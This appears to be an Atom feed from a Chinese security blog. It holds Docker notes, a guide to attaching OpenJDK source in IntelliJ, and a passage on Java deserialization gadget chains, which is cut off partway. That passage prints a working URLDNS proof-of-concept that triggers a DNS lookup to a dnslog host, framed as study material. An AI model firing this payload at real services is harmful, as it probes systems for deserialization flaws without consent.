<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0range的小窝</title>
  
  <subtitle>Hello,World.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://0range228.github.io/"/>
  <updated>2021-05-19T06:34:05.328Z</updated>
  <id>https://0range228.github.io/</id>
  
  <author>
    <name>0range</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="https://0range228.github.io/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://0range228.github.io/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-05-19T03:17:25.000Z</published>
    <updated>2021-05-19T06:34:05.328Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>欲穷千里目，更上一层楼。</p></blockquote><p>我在调试漏洞的过程中会密切地和Docker打交道，今天来总结一下。</p><a id="more"></a><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>Docker包括三个基本概念：</p><ul><li>镜像<code>Image</code></li><li>容器<code>Container</code></li><li>仓库<code>Repository</code></li></ul><p>镜像就像类，容器就像实例。</p><p>容器的实质是进程，容器进程属于自己独立的命名空间，也就是进程隔离</p><p>仓库是容器的存储分发，默认仓库内的镜像是<code>&lt;仓库名&gt;:&lt;Tag&gt;</code>，默认tag是latest</p><p>对于一个<a href="https://hub.docker.com/_/ubuntu" target="_blank" rel="noopener">ubuntu</a>仓库来说：</p><p>ubuntu是仓库的名字，<code>ubuntu：16.04</code>和<code>ubuntu:18.04</code>则是两个不同标签代表不同版本。</p><p>仓库通常是<strong>两段式命名</strong>，例如<code>ownername/nginx</code></p><p>前者是用户名，后者是软件名</p><h1 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h1><h2 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull [args] [域名[：端口号] /] 仓库名[:标签]</span><br></pre></td></tr></table></figure><p><code>docker pull --help</code>看细节</p><ul><li>docker仓库地址：<code>&lt;域名/IP&gt;[:端口号]</code> 默认地址是docker.io</li><li>仓库名：<code>&lt;仓库名/软件名&gt;</code> 仓库名不写默认是library，也就是官方镜像</li></ul><p>比如：<code>docker pull ubuntu：18.04</code></p><p>完整仓库名就是：<code>docker.io/library/ubuntu:18.04</code></p><h2 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -i -t --rm ubuntu:18.04 /bin/bash</span></span><br></pre></td></tr></table></figure><p>解读：</p><ul><li><code>-i</code>参数是启动容器内交互式操作模式</li><li><code>-t</code>参数是在容器内开启一个终端</li><li><code>--rm</code>代表容器退出后随之将该容器删除，不必再手动rm</li><li><code>bash</code>就是给容器的命令，这里我们希望得到交互式shell，所以打开bash</li></ul><p>其他参数：</p><ul><li><code>-d</code>可以让容器在后台运行</li><li><code>-p</code></li><li><code>exit</code>退出容器</li></ul><h2 id="列出镜像"><a href="#列出镜像" class="headerlink" title="列出镜像"></a>列出镜像</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image ls</span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519121316891.png" alt="image-20210519121316891"></p><p>参数：</p><ul><li><code>docker image ls -q</code>只显示image的id</li><li><code>docker image ls ubuntu</code>只显示仓库名是ubuntu的image</li></ul><h2 id="删除本地镜像"><a href="#删除本地镜像" class="headerlink" title="删除本地镜像"></a>删除本地镜像</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image rm [args] &lt;image<span class="string">'s id/reponame/&gt;</span></span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>这里面的<code>image&#39;s id</code>通常可以是长ID12位，也可以仅仅是前3位短id</li></ul><p>配合docker image ls</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们需要删除所有仓库名为 redis 的镜像：</span><br><span class="line">docker image rm $&#123;docker image ls -q redis&#125;</span><br></pre></td></tr></table></figure><h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><h2 id="新建-amp-启动"><a href="#新建-amp-启动" class="headerlink" title="新建&amp;启动"></a>新建&amp;启动</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> ubuntu:18.04 /bin/<span class="built_in">echo</span> <span class="string">"helloworld"</span></span></span><br></pre></td></tr></table></figure><h2 id="守护态运行"><a href="#守护态运行" class="headerlink" title="守护态运行"></a>守护态运行</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> ubuntu /bin/sh -c <span class="string">"while true; do echo hello world; sleep 1; done"</span></span></span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519122754667.png" alt="image-20210519122754667"></p><p>会将结果打印在本地终端，这里需要启动<code>-d</code>参数，来让容器在后台运行：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d ubuntu /bin/sh -c <span class="string">"while true; do echo hello world; sleep 1; done"</span></span></span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519122959476.png" alt="image-20210519122959476"></p><p>就不再会打印到本地终端。</p><p>使用<code>docker logs 86d4eab113a908ce2ee49fa46145623d62a290a76ab3807429588f7c2868bd6</code>来查看</p><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519123132506.png" alt="image-20210519123132506"></p><p>输出内容会在日子里体现出来，</p><h2 id="查看运行中的容器"><a href="#查看运行中的容器" class="headerlink" title="查看运行中的容器"></a>查看运行中的容器</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container ls</span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519130640053.png" alt="image-20210519130640053"></p><p>对比可以发现，刚才那一长串才是完整ID</p><p>查看自动容器的日志：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container logs [id or name]</span><br></pre></td></tr></table></figure><h2 id="终止-amp-重启容器"><a href="#终止-amp-重启容器" class="headerlink" title="终止&amp;重启容器"></a>终止&amp;重启容器</h2><p>首先，当容器内的程序结束时，容器也将自动终止。</p><p>对于一般情况，可以使用<code>docker container stop [id or name]</code>来终止</p><p>终止状态的docker信息可以<code>docker container ls -a</code>来查看</p><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519131228416.png" alt="image-20210519131228416"></p><p>当然</p><p>对于已经停掉的容器，重新启动可以<code>docker container start [id or name]</code></p><p>对于正在运行的容器，强制重新启动可以<code>docker container restart [id or name]</code></p><h2 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h2><p>attach和exec都可以，更推荐exec</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker container ls</span><br><span class="line"></span><br><span class="line">docker exec -it [shortid] /bin/bash</span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519132015322.png" alt="image-20210519132015322"></p><p>原因：</p><ul><li><code>-it</code>一起使用时，可以进入交互模式，并且可以看到熟悉的<code>linux</code>命令提示符</li></ul><h2 id="容器的导出-amp-导入"><a href="#容器的导出-amp-导入" class="headerlink" title="容器的导出&amp;导入"></a>容器的导出&amp;导入</h2><p><strong>导出</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export id &gt; ubuntu.tar</span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519132819881.png" alt="image-20210519132819881"></p><p><strong>导入</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat ubuntu.tar | docker import - <span class="built_in">test</span>/ubuntu:v1.0</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker image ls</span></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED              VIRTUAL SIZE</span><br><span class="line">test/ubuntu         v1.0                9d37a6082e97        About a minute ago   171.3 MB</span><br></pre></td></tr></table></figure><p>也可以通过网址来import：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="keyword">import</span> http:<span class="comment">//example.com/exampleimage.tgz example/imagerepo</span></span><br></pre></td></tr></table></figure><h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><p><strong>删除正在运行的容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container rm -f [id or name]</span><br></pre></td></tr></table></figure><p><strong>删除所有容器</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container prune</span><br></pre></td></tr></table></figure><h2 id="外部网络访问容器"><a href="#外部网络访问容器" class="headerlink" title="外部网络访问容器"></a>外部网络访问容器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P nginx</span><br></pre></td></tr></table></figure><p><code>-P</code>参数的意思就是随机打开一个本地端口</p><p>查看访问日志；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs id</span><br></pre></td></tr></table></figure><p><code>-p</code> 则可以指定要映射的端口，并且，在一个指定端口上只可以绑定一个容器。支持的格式有 <code>ip:hostPort:containerPort | ip::containerPort | hostPort:containerPort</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-p 55500:80</span><br></pre></td></tr></table></figure><p>意思就是本机的55500端口映射给80端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-p 80:80</span><br></pre></td></tr></table></figure><p>的意思就是<strong>映射全部端口</strong>。</p><p>比较：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-p 80:80 绑定对应所有端口</span><br><span class="line">-p 127.0.0.1:80:80 指定映射使用一个特定地址</span><br><span class="line">-p 127.0.0.1::80 绑定本地的任意端口给容器的80端口</span><br></pre></td></tr></table></figure><p><strong>查看端口映射的配置</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port id 80</span><br></pre></td></tr></table></figure><p>查看当前所有的网络配置</p><p><strong>查看docker内部网络地址</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect id</span><br></pre></td></tr></table></figure><h1 id="额外的备忘命令"><a href="#额外的备忘命令" class="headerlink" title="额外的备忘命令"></a>额外的备忘命令</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看当前运行的容器</span></span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看所有容器，包括停止的</span></span><br><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看最新创建的容器，只列出最后创建的</span></span><br><span class="line">docker ps -l</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看网络端口</span></span><br><span class="line">docker port [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看容器内部的标准输出</span></span><br><span class="line">docker logs [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看容器内部运行的进程</span></span><br><span class="line">docker top [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看 Docker 的底层信息。它会返回一个 JSON 文件记录着 Docker 容器的配置和状态信息</span></span><br><span class="line">docker inspect [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除指定image</span></span><br><span class="line">docker rmi image_id</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除容器，删除容器时，容器必须是停止状态</span></span><br><span class="line">docker rm [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除所有的容器</span></span><br><span class="line">docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://yeasy.gitbook.io/docker_practice/" target="_blank" rel="noopener">Docker-入门到实战</a></p><p><a href="https://segmentfault.com/a/1190000017151019" target="_blank" rel="noopener">MacOS Docker安装和使用</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;欲穷千里目，更上一层楼。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我在调试漏洞的过程中会密切地和Docker打交道，今天来总结一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="https://0range228.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Docker" scheme="https://0range228.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>记一次对线rt.jar</title>
    <link href="https://0range228.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/"/>
    <id>https://0range228.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/</id>
    <published>2021-05-13T06:39:35.000Z</published>
    <updated>2021-05-13T07:35:27.002Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>独立三边静，轻生一剑知。</p></blockquote><p>记录一次对线rt.jar的经历。</p><a id="more"></a><h1 id="过程全记录"><a href="#过程全记录" class="headerlink" title="过程全记录"></a>过程全记录</h1><p>前一阵在复习CC链的时候，想着从PoC来逆向分析ysoserial师傅们的挖掘思路。</p><p>LayMap函数的get函数很有挖掘潜力，所以我需要找哪些类调用了get方法。</p><p>已知答案是AnnotationInvocationHandler的invoke函数调用了get函数，可以执行下去。</p><p>现在我想用IDEA搜索一下，但是无奈没有找到。</p><p>发现这个类属于sun.reflect.annotation包，位于rt.jar中，主动去搜索这个类你是可以看到的。</p><p><strong>IDEA可以反编译出来rt.jar的源码，但是不会帮你进去搜索代码细节，因为它没有源码</strong></p><p>直接去翻$JAVA_HOME，src.zip里面是jdk源码，但是并没有sun包。。</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513153049164.png" alt="image-20210513153049164"></p><p>搜索资料，我发现sun是oracle选择闭源的几个包之一。</p><p>Oracle选择性闭源？无奈又好笑，这能忍？</p><p>如何拿到rt.jar的源码，火速学习了一波。</p><p>所以我想着先去搞到openJDK7的源码。</p><p>搜了一波，发现<a href="http://hg.openjdk.java.net/" target="_blank" rel="noopener">http://hg.openjdk.java.net/</a>可以搞到源码，网速感人，要有耐心。。。</p><p>以我自己的7u21为例子：</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150521166.png" alt="image-20210513150521166"></p><p>点击jdk7u-jdk，进去之后点击browse可以看内容</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150614447.png" alt="image-20210513150614447"></p><p>也可以不废话，直接点击zip下载</p><p>然后就拿到了一个zip解压：</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150829266.png" alt="image-20210513150829266"></p><p>然后依次进入src-share-classes，看到了sun：</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150912940.png" alt="image-20210513150912940"></p><p>也就是说，IDEA无法帮我们搜索的内容，我们现在可以自己添加进去了。</p><p>如何关联？</p><p>来到Project Structure - SKDs，把我们的源码的classes添加进去就可以了</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513151529264.png" alt="image-20210513151529264"></p><p>这次再搜索一下，直接find in path 搜索path</p><p>就可以看到了：</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513151800556.png" alt="image-20210513151800556"></p><p>翻出了JD-GUI，比较一下。</p><p>我是直接来到$JAVA_HOME，进入jre/lib，这些东西会参与java-runtime</p><p>啪的一下很快奥！</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513152337666.png" alt="image-20210513152337666"></p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513152445982.png" alt="image-20210513152445982"></p><p>不得不佩服西方老师傅门的耐心，漏洞在牛角尖上。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://my.oschina.net/u/2518341/blog/1931088" target="_blank" rel="noopener">获取openJDK源码</a></p><p><a href="https://www.jianshu.com/p/96334b23f4f0" target="_blank" rel="noopener">JDK（rt.jar）源码和IDE关联</a></p><p><a href="http://hg.openjdk.java.net/" target="_blank" rel="noopener">http://hg.openjdk.java.net/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;独立三边静，轻生一剑知。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;记录一次对线rt.jar的经历。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java代码审计" scheme="https://0range228.github.io/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="实战记录" scheme="https://0range228.github.io/tags/%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化利用链补全计划</title>
    <link href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/"/>
    <id>https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/</id>
    <published>2021-05-11T08:19:57.000Z</published>
    <updated>2021-05-23T15:20:06.141Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>温故而知新。</p></blockquote><p>站在巨人们的肩膀上，总结Java反序列化漏洞利用链，会持续更新。</p><p>同步项目：<a href="https://github.com/0range228/Gadgets" target="_blank" rel="noopener">Gadgets</a></p><a id="more"></a><h1 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h1><p>Java反序列化RCE三要素：<strong>readobject反序列化利用点 + 利用链 + RCE触发点</strong>。</p><p>审计maven仓库里面的jar包时，记得先拿到源码：</p><ul><li>点右上角download source </li><li>下载pom.xml里面声明的依赖jars：mvn dependency:resolve -Dclassifier=sources</li><li>JD-GUI</li><li></li></ul><h1 id="readObject源码分析"><a href="#readObject源码分析" class="headerlink" title="readObject源码分析"></a>readObject源码分析</h1><p>梦开始的地方。</p><p>正常使用反序列化，就会执行java.io.ObjectInputStream类中的readObejct方法。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511172731640.png" alt="image-20210511172731640"></p><p><strong>重点分析readObject0方法，它是核心方法。</strong>跟进去看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511173117069.png" alt="image-20210511173117069"></p><p>这里最重要的是进行了对象类型的选择，根据不同类型执行操作。</p><p>这里会先执行readOrdinaryObject方法，unshared是false。</p><p>进去看看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511174136473.png" alt="image-20210511174136473"></p><p>看到点眉目了，<strong>readSerialData其实才是真正反序列化对象</strong>，进入readSerialData函数看看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511192758582.png" alt="image-20210511192758582"></p><p>到这里，可以理清整个过程的关键步骤了。</p><p>在readSerialData中比较关键的是这个判断条件：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511175925746.png" alt="image-20210511175925746"></p><p>其中slotDesc.hasReadObjectMethod()获取的是readObjectMethod这个属性，<strong>如果反序列化的类没有重写readobject()，那么readObjectMethod这个属性就是空</strong>，如果这个类重写了readobject()，就会执行readObject()方法。</p><p>所以这也就是为什么，挖掘这类漏洞，上来第一件事就是要：<strong>找到哪些类有重写readObject()方法</strong>。</p><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><blockquote><p>readobject反序列化利用点 + DNS查询，主要用来确认反序列化漏洞利用点的存在。</p></blockquote><p>最适合新手分析的反序列化链。ysoserial的一部分。</p><p>只依赖原生类，没有jdk版本限制。</p><p>dnslog平台可以选择：<a href="http://www.dnslog.cn/" target="_blank" rel="noopener">DNSLog.cn</a>，<a href="http://ceye.io" target="_blank" rel="noopener">ceye</a>，我选择了DNSLog。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>jdk版本：jdk8u162，网上PoC很多，这里用<a href="https://www.anquanke.com/post/id/201762" target="_blank" rel="noopener">lalajun</a>师傅的为例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//0x01.生成payload</span></span><br><span class="line">        <span class="comment">//设置一个hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        <span class="comment">//设置我们可以接受DNS查询的地址</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://oh6pfs.dnslog.cn"</span>);</span><br><span class="line">        <span class="comment">//将URL的hashCode字段设置为允许修改</span></span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      </span><br><span class="line">        <span class="comment">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span></span><br><span class="line">        <span class="comment">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>); </span><br><span class="line">        <span class="comment">//2. 将url放入hashMap中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">"rmb122"</span>);</span><br><span class="line">        <span class="comment">//修改url的hashCode字段为-1，为了触发DNS查询</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>); </span><br><span class="line">      </span><br><span class="line">        <span class="comment">//0x02.写入文件模拟网络传输</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        <span class="comment">//0x03.读取文件，进行反序列化触发payload</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功触发dns查询记录：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511165114468.png" alt="image-20210511165114468"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>三要素：HashMap / URL / HashCode</p><p>大体流程：</p><ol><li>new一个HashMap对象，key-value对为URL-String类型，key设置为我们的dnslog的地址</li><li>暴力反射，将URL类的hashCode字段改为public，默认是private</li><li>将url对象的hashCode字段随便改成一个值</li><li>将url对象放入HashMap中作为key，value也随便写一个</li><li>将f对象的hashCode字段改为-1，<strong>触发漏洞</strong></li></ol><p>最终的payload结构是 一个HashMap，里面包含了 一个修改了hashCode为-1的URL类对象。</p><p><strong>由于HashMap类自己有实现readObject方法，那么在反序列化过程中就会执行他自己的readObject。</strong></p><h3 id="搞懂HashMap"><a href="#搞懂HashMap" class="headerlink" title="搞懂HashMap"></a>搞懂HashMap</h3><blockquote><p><strong>HashMap 可以看作是一个链表散列的数据结构 , 也就是数组和链表的结合体.</strong></p></blockquote><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511193717145.png" 